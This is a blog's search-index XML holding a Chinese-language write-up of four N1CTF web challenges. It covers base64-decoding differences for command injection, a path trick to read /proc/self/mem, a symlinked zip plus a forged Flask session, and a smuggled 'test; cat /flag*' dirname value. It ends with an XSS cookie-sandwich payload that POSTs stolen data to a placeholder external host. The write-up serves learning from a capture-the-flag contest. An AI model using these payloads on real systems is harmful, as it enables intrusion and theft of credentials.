<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>n1ctf_web_wp</title>
    <link href="/2025/09/15/n1ctf-web-wp/"/>
    <url>/2025/09/15/n1ctf-web-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="ping"><a href="/2025/09/15/n1ctf-web-wp/#ping" class="headerlink" title="ping"></a>ping</h1><p>分析代码，显然需要在</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">command = <span class="hljs-string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="hljs-subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>进行命令执行，只需要让$(echo ‘{ip_base64}’ | base64 -d)  –&gt;    127.0.0.1;whoami  拼接一下即可</p><p>但是由于前面的正则匹配等严格要求了解码后必须是ip的格式，所以只能进行绕过</p><p>尝试绕过正则无果   观察到明明一开始就对ip_base64进行了一次base64解码，但是在命令执行的时候明明可以直接使用却还要解码一次，猜测是两种解码方式的差异</p><p>思路是让python的base64.b64decode()函数只解析出前面的ip地址，而bash在base64 -d 的时候解析出完整的拼接后的命令</p><p>分析python b64decode函数的源码发现底层由c实现，注意到如下代码</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250914232153626.png" alt="image-20250914232153626"></p><p>也就是当python解析到&#x3D;&#x3D;之后如果后面还有内容，在严格模式下会报错，而非严格模式下会停止解析但不会报错，可以试验一下</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250914232401063.png" alt="image-20250914232401063"></p><p>python成功只解码出了1.1.1.1，而bash却能解析出完整的命令</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250914232507326.png" alt="image-20250914232507326"></p><p>利用这个就能绕过检测并且拼接执行命令了，直接cat &#x2F;flag即可，如下图</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250914234321695.png" alt="image-20250914234321695"></p><h1 id="Peek-a-Fork"><a href="/2025/09/15/n1ctf-web-wp/#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>代码审计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read()<br>mm = mmap.mmap(-<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(flag))<br>mm.write(flag)<br>os.remove(<span class="hljs-string">&#x27;flag.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>flag放到了匿名进程中，可以通过读取&#x2F;proc&#x2F;self&#x2F;mem函数读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> filename:<br>            response_body = PAGE<br>            response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.normpath(filename), <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-keyword">if</span> offset &gt; <span class="hljs-number">0</span>:<br>                        f.seek(offset)<br>                    <br>                    data_bytes = f.read(length)<br> <br>                    response_body = data_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                response_status = <span class="hljs-string">&quot;200 OK&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><br>                response_body = <span class="hljs-string">f&quot;Invalid path&quot;</span><br>                response_status = <span class="hljs-string">&quot;500 Internal Server Error&quot;</span><br><br>        response = <span class="hljs-string">f&quot;HTTP/1.1 <span class="hljs-subst">&#123;response_status&#125;</span>\r\nContent-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(response_body)&#125;</span>\r\n\r\n<span class="hljs-subst">&#123;response_body&#125;</span>&quot;</span><br>        conn.sendall(response.encode())<br></code></pre></td></tr></table></figure><p>这里可以读文件，找一下filename的定义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    path = request_data.split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">1</span>]<br>    pattern = <span class="hljs-string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span><br>    <br>    offset = <span class="hljs-number">0</span><br>    length = -<span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">match</span> = re.search(pattern, path)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>        offset = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>).decode())<br>        length = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>).decode())<br>        <br>        clean_path = re.sub(pattern, <span class="hljs-string">b&#x27;&#x27;</span>, path)<br>        filename = clean_path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br>    <span class="hljs-keyword">else</span>:<br>        filename = path.strip(<span class="hljs-string">b&#x27;/&#x27;</span>).decode()<br><br><span class="hljs-keyword">except</span> Exception:<br>    response = <span class="hljs-string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span><br>    conn.sendall(response)<br>    <span class="hljs-keyword">return</span><br><br></code></pre></td></tr></table></figure><p>这里获取clean_path的逻辑是先匹配到?offset&#x3D;(\d+)&amp;length&#x3D;(\d+)，然后从path里面把这一整串给去除掉</p><p>然后去除掉首尾的&#x2F;得到filename</p><p>漏洞点在于waf是在main函数中获取到初始数据的时候就直接检测的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(term <span class="hljs-keyword">in</span> initial_data.lower() <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> FORBIDDEN):<br>    conn.sendall(<span class="hljs-string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)<br>    conn.close()<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>如果存在这种情况</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">path</span> = rb<span class="hljs-string">&quot;/pro?offset=1&amp;length=1c&quot;</span><br><span class="hljs-attr">clean_path</span> = b<span class="hljs-string">&quot;/proc&quot;</span><br><span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;proc&quot;</span><br></code></pre></td></tr></table></figure><p>这样就可以绕过黑名单传入proc了，还有一个问题是proc在根目录所以要穿越一下</p><p>利用相同的原理绕过.. 和.&#x2F;的限制</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile">path=rb<span class="hljs-string">&quot;?offset=0&amp;length=100000.?offset=0&amp;length=100000.?offset=0&amp;length=100000/pro?</span><br><span class="hljs-string">offset=0&amp;length=100000c/self/environ&quot;</span><br><br>clean_path = b<span class="hljs-string">&quot;../proc/self/environ&quot;</span><br>filename= <span class="hljs-string">&quot;../proc/self/environ&quot;</span><br>能直接读到环境变量文件<br></code></pre></td></tr></table></figure><p>所以接下来我们读&#x2F;proc&#x2F;self&#x2F;mem文件就能拿到flag</p><p>直接访问</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>会发现返回invalid path</p><p>查了一下发现是因为读取mem文件有权限要求，有些不可读的部分，只能读取有权限的部分，这里可以通过offset和length来控制</p><p>读一下&#x2F;proc&#x2F;self&#x2F;maps文件查看python进程的内存地址</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250915001049199.png" alt="image-20250915001049199"></p><p>这里选择从7f7861a02000（140155010686976）爆破到7ffc799d2000（140722348826624），把内存地址转换为十进制数然后传给offset参数设置一下步长，爆破速度挺快的</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">offset</span>=<span class="hljs-number">140155010686976</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000.</span>?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>/pro?<span class="hljs-built_in">offset</span>=<span class="hljs-number">0</span>&amp;<span class="hljs-built_in">length</span>=<span class="hljs-number">100000</span>c/self/mem<br></code></pre></td></tr></table></figure><p>最后在7f7862fd8000-7f7862fd9000这一块内存中读到了 查了一下发现是因为mmap是创建了匿名内存映射，这一块就是匿名内存</p><h1 id="online-unzipper"><a href="/2025/09/15/n1ctf-web-wp/#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h1><p>代码审计找到漏洞点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    os.system(<span class="hljs-string">f&quot;unzip -o <span class="hljs-subst">&#123;zip_path&#125;</span> -d <span class="hljs-subst">&#123;target_dir&#125;</span>&quot;</span>)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;解压失败，请检查文件格式&quot;</span><br></code></pre></td></tr></table></figure><p>这里有一个命令执行，如果存在可控的地方就能利用这里读出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> role == <span class="hljs-string">&quot;admin&quot;</span>:<br>    dirname = request.form.get(<span class="hljs-string">&quot;dirname&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">str</span>(uuid.uuid4())<br><span class="hljs-keyword">else</span>:<br>    dirname = <span class="hljs-built_in">str</span>(uuid.uuid4())<br><br>target_dir = os.path.join(UPLOAD_FOLDER, dirname)<br>os.makedirs(target_dir, exist_ok=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>发现如果是admin用户的话就能指定dirname，本质上也就是指定了target_dir，同样是拼接一下就能执行命令</p><p>接下来需要看看如何登录admin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">role = session[<span class="hljs-string">&quot;role&quot;</span>]<br></code></pre></td></tr></table></figure><p>role是从session中获取的，普通用户注册的时候role只能是user</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br><br>        <span class="hljs-keyword">if</span> username <span class="hljs-keyword">in</span> users:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;用户名已存在&quot;</span><br><br>        users[username] = &#123;<span class="hljs-string">&quot;password&quot;</span>: password, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>&#125;<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br></code></pre></td></tr></table></figure><p>那么肯定是要伪造session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = os.environ.get(<span class="hljs-string">&quot;FLASK_SECRET_KEY&quot;</span>, <span class="hljs-string">&quot;test_key&quot;</span>)<br></code></pre></td></tr></table></figure><p>session的key是从环境变量中获取的，所以还是需要读一下&#x2F;proc&#x2F;self&#x2F;environ文件</p><p>我们上传的压缩包会通过unzip -o进行解压，解压时如果 ZIP 包中包含软链接文件，<code>unzip</code>默认会保留软链接的指向关系</p><p>所以可以利用软链接来实现任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /proc/self/environ <span class="hljs-built_in">link</span>   创建一个软链接<br><br>zip -y exploit.zip <span class="hljs-built_in">link</span><br><br>上传exploit.zip，直接访问里面的<span class="hljs-built_in">link</span>就能获取到环境变量文件<br><br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250915003503909.png" alt="image-20250915003503909"></p><p>FLASK_SECRET_KEY&#x3D;#mu0cw9F#7bBCoF! </p><p>接下来利用这个key生成一个admin的session再替换我们自己注册的用户的session</p><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250915003552152.png" alt="image-20250915003552152"></p><p>用户变为admin之后发现上传文件时多了一个指定dirname的输入框，随便上传一个文件同时传入</p><p>dirname&#x3D;test; cat &#x2F;flag* &gt; .&#x2F;uploads&#x2F;test&#x2F;flag.txt</p><p>再访问&#x2F;download&#x2F;test&#x2F;flag.txt就能拿到flag</p><h1 id="Unfinished"><a href="/2025/09/15/n1ctf-web-wp/#Unfinished" class="headerlink" title="Unfinished"></a>Unfinished</h1><p>首先还是寻找漏洞点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        flag_value = os.environ.get(<span class="hljs-string">&#x27;FLAG&#x27;</span>, <span class="hljs-string">&#x27;flag&#123;fake&#125;&#x27;</span>)<br><br>        <span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:<br>            browser = p.chromium.launch(headless=<span class="hljs-literal">True</span>, args=[<span class="hljs-string">&quot;--no-sandbox&quot;</span>])<br>            context = browser.new_context()<br><br>            context.add_cookies([&#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>                <span class="hljs-string">&#x27;value&#x27;</span>: flag_value,<br>                <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>                <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>                <span class="hljs-string">&#x27;httponly&#x27;</span>: <span class="hljs-literal">True</span><br>            &#125;])<br><br>            page = context.new_page()<br>            page.goto(<span class="hljs-string">&quot;http://localhost/login&quot;</span>, timeout=<span class="hljs-number">5000</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;username&#x27;]&quot;</span>, <span class="hljs-string">&quot;admin&quot;</span>)<br>            page.fill(<span class="hljs-string">&quot;input[name=&#x27;password&#x27;]&quot;</span>, admin_password)<br>            page.click(<span class="hljs-string">&quot;input[name=&#x27;submit&#x27;]&quot;</span>)<br>            page.wait_for_timeout(<span class="hljs-number">3000</span>)<br>            page.goto(url, timeout=<span class="hljs-number">5000</span>)<br>            page.wait_for_timeout(<span class="hljs-number">5000</span>)<br>            browser.close()<br></code></pre></td></tr></table></figure><p>观察到这个函数是bot会先登录然后去访问传入的url，而在view路由中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/view&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_user</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    # I found a bug in it.</span><br><span class="hljs-string">    # Until I fix it, I&#x27;ve banned /api/bio/. Have fun :)</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    username = request.args.get(<span class="hljs-string">&quot;username&quot;</span>,default=current_user.username)<br>    visit_url(<span class="hljs-string">f&quot;http://localhost/api/bio/<span class="hljs-subst">&#123;username&#125;</span>&quot;</span>)<br>    template = <span class="hljs-string">f&quot;&quot;&quot;</span><br><span class="hljs-string">    &#123;&#123;% extends &quot;base.html&quot; %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block title %&#125;&#125;success&#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &#123;&#123;% block content %&#125;&#125;</span><br><span class="hljs-string">    &lt;h1&gt;bot will visit your bio&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;p style=&quot;margin-top: 1.5rem;&quot;&gt;&lt;a href=&quot;&#123;&#123;&#123;&#123; url_for(&#x27;index&#x27;) &#125;&#125;&#125;&#125;&quot;&gt;Back to Home&lt;/a&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &#123;&#123;% endblock %&#125;&#125;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> render_template_string(template)<br></code></pre></td></tr></table></figure><p>登录之后就会让bot去访问一下<a href="http://localhost/api/bio/%7Busername%7D%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84bio%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%90%8C%E6%97%B6%E6%9C%89%E4%B8%80%E4%B8%AA%E7%BC%96%E8%BE%91%E6%88%91%E4%BB%ACbio%E7%95%8C%E9%9D%A2%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BE%88%E5%AE%B9%E6%98%93%E8%81%94%E6%83%B3%E5%88%B0xss%EF%BC%8C%E4%BD%86%E6%98%AF%E6%9C%89%E4%B8%89%E4%B8%AA%E9%97%AE%E9%A2%98%EF%BC%8C%E7%AC%AC%E4%B8%80%E4%B8%AA%E6%98%AFnginx%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%A6%81%E6%AD%A2%E4%BA%86%E8%AE%BF%E9%97%AE/api/bio">http://localhost/api/bio/{username}，也就是我们的bio界面，同时有一个编辑我们bio界面的功能，所以很容易联想到xss，但是有三个问题，第一个是nginx的配置中禁止了访问/api/bio</a></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span> default_server;<br>    <span class="hljs-attribute">server_name</span> _;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>    &#125;<br><br>    <span class="hljs-section">location</span> /api/bio/ &#123;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">403</span>;<br>    &#125;<br><br>    <span class="hljs-section">location</span> <span class="hljs-regexp">~ \.(css|js)$</span> &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://127.0.0.1:5000;<br>        <span class="hljs-attribute">proxy_ignore_headers</span> Vary;<br>        <span class="hljs-attribute">proxy_cache</span> static_cache;<br>        <span class="hljs-attribute">proxy_cache_valid</span> <span class="hljs-number">200</span> <span class="hljs-number">10m</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是呢，如果是以js,css结尾的静态资源，就会被代理并且写入缓存中，本意是为了减少服务器的消耗，而这里帮我们绕过了&#x2F;api&#x2F;bio&#x2F;，只要我们的username是以js或者css结尾的，访问<a href="http://localhost/api/bio/%7Busername%7D%E7%9A%84%E6%97%B6%E5%80%99%E5%B0%B1%E4%B8%8D%E4%BC%9A%E8%BF%94%E5%9B%9E403">http://localhost/api/bio/{username}的时候就不会返回403</a></p><p>假设我们的用户名为1.js，第二个问题是 bot在访问我们的bio界面的时候，有一个身份的校验，就是只有自己能访问自己的bio</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.username == username:<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unauthorized&quot;</span>, <span class="hljs-number">401</span><br></code></pre></td></tr></table></figure><p>这里也好解决，前面说了如果是js或者css结尾的请求会被写到缓存里，下次读的时候会直接读缓存里的东西，那么我们先自己去访问一下&#x2F;api&#x2F;bio&#x2F;1.js，再通过&#x2F;view路由让bot去访问，这样username是1.js，current_user.username实际上的从缓存里面读出来的就能绕过了</p><p>第三个问题时httpOnly，但是可以注意到题目中其实写的时httponly,其实是失效的，直接用xss的payload就能打出来</p><p><strong>如果这个httpOnly是生效的怎么办？</strong></p><p>这样的话直接利用xss是带不出cookie的,利用三明治攻击可以把受httpOnly保护的cookie窃取出来</p><p>大致原理就是让服务器错误解析，利用cookie&#x3D;ticket&#x3D;”abc;    aaa&#x3D;bbb”让服务器错误解析从而将访问者的cookie放到中间带了出来</p><p>讲解文章：<a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique</a></p><p>payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">&quot;http://localhost/ticket&quot;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`$Version=1; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`ticket=&quot;abc; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=<span class="hljs-subst">$&#123;url.pathname&#125;</span>;`</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`aaa=bbb&quot;; domain=<span class="hljs-subst">$&#123;url.hostname&#125;</span>; path=/;`</span>;<br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;/ticket&quot;</span>, &#123;<br>        <span class="hljs-attr">credentials</span>: <span class="hljs-string">&#x27;include&#x27;</span>,<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();<br>&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://xxx.xx.xx.xxx:7777/&quot;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>                <span class="hljs-attr">body</span>: data,<br>        &#125;);<br>&#125;)<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/2025/09/15/n1ctf-web-wp//2025/09/10/hello-world/image-20250915205435704.png" alt="image-20250915205435704"></p><p>因为在访问&#x2F;ticket的时候会回显自己的ticket的值，再把请求结果拿出来传到自己的服务器上就能看到flag了</p><h2 id="分析"><a href="/2025/09/15/n1ctf-web-wp/#分析" class="headerlink" title="分析"></a>分析</h2><p>这题比赛中没打出来，当时想到了xss，但是看到httponly不知道有三明治攻击这个东西，也没注意到写错了</p><p>并且也没仔细去阅读代码，nginx的配置文件没认真看</p><h1 id="总结"><a href="/2025/09/15/n1ctf-web-wp/#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>分析解析差异之类的题目时要耐下心来去翻源代码</li><li>&#x2F;proc&#x2F;self&#x2F;maps存放进程的内存地址，&#x2F;proc&#x2F;self&#x2F;mem文件存在不可读部分，不能直接读</li><li>unzip -o解压可以利用软链接实现任意文件读取</li><li>三明治攻击可以绕过httpOnly，nginx配置文件也会有关键信息，利用缓存绕过了身份验证</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>base64解码差异</tag>
      
      <tag>/proc/self/maps&amp;mem文件</tag>
      
      <tag>wp</tag>
      
      <tag>xss三明治攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
